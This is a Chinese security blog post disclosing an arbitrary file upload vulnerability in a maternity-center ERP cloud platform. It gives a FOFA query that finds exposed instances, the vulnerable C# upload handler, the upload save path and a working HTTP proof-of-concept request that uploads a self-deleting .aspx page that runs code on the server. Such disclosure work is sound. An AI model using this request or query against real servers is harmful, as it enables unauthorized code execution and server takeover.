---
title: "月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html
asset_dir: assets/月子会所erp管理云平台-pagemicromallashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/3 18:25
- 818浏览
- [0评论](#comment)
- 25分钟阅读

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/MicroMall/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

直接看其业务实现逻辑

```
public class Handler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     
                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";

                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_SUPPLIER_URL"].ToString();

                mypost.SaveAs(context.Server.MapPath( url + newname));
                System.Threading.Thread.Sleep(100);
            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);
    }
    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;

    }
```

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_SUPPLIER\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_SUPPLIER_URL" value="../../UploadBaseFolder/Supplier/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Supplier/文件名

# 漏洞复现

## POC

```
POST /Page/MicroMall/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Supplier/响应文件名

漏洞扫描服务

[![月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-cb38ad55ea40.webp)](https://image.mrxn.net/dcc6bb8d4f5c431e976ef844994162d4.webp)

成功打印随机GUID字符串并删除自身。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [4.1.POC](#toc-4-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
